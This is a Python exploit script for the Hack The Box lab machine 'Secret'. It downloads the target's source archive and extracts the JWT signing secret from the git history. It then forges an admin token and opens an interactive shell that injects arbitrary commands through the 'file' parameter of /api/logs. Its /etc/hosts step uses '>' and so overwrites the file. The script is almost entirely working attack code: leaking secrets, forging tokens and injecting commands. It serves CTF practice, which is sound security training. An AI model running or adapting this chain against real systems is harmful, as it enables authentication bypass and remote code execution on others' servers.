#!/usr/bin/env python3

import argparse
import cmd
import subprocess
import shlex
import requests
import jwt
from urllib.parse import urlencode

TARGET_NAME = 'secret'

class App(cmd.Cmd):
    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip
        self.prompt = f"{TARGET_NAME}.htb> "
        self.url = 'http://secret.htb'
        self.token = None

    def exploit(self):
        self.add_hosts()
        self.analysis_source()
        self.forge_token()

    def log(self, msg):
        print(f"[*] {msg}")

    def execute(self, cmd):
        argv = shlex.split(cmd)
        p = subprocess.run(argv, capture_output=True, check=True)
        return p

    def add_hosts(self):
        self.log('Add target hostname into /etc/hosts')
        cmd = f"sh -c \"echo {self.target_ip} {TARGET_NAME}.htb> /etc/hosts\""
        self.execute(cmd)

    def analysis_source(self):
        '''
        Get the JWT token secret from the source code we download
        '''
        self.log('Download the git repository from http://secret.htb/download/files.zip')
        self.execute("wget http://secret.htb/download/files.zip")

        self.log('unzip the downlaod file "files.zip"')
        self.execute("unzip files.zip")

        self.log('Get the JWT token secret from the git commit history')
        p = self.execute("sh -c \"cd local-web; git log -u .env | tail -n 1\"")
        self.jwt_secret = p.stdout.decode().strip().split('= ')[1]

        self.log(f"JWT token secret: {self.jwt_secret}")

    def forge_token(self):
        data = dict(_id=123,
                name='theadmin',
                email='jarjar@example.com')
        secret = self.jwt_secret
        self.token = jwt.encode(data, secret, algorithm="HS256")

    def do_register(self):
        '''
        Register a new user named jarjar
        '''
        self.log('Register a new user')
        data = dict(email='jarjar@example.com',
                name='jarjar',
                password='P@ssw0rd')
        url = self.url + '/api/user/register'
        res = requests.post(url, json=data)
        print(res)
        print(res.text)

    def default(self, cmd):
        assert self.token != None
        headers = {
                'auth-token': self.token
                }
        query = urlencode(dict(file=f"123 2> /dev/null; {cmd}"))
        url = self.url + '/api/logs?' + query
        res = requests.get(url, headers=headers)
        print("%s" % res.text)

    def empty(self):
        pass

    def do_EOF(self, cmd):
        return True

if __name__ == '__main__':
    parser = argparse.ArgumentParser('')
    parser.add_argument('target', help="The target's IP")

    args = parser.parse_args()

    app = App(args.target)
    app.exploit()
    app.cmdloop()
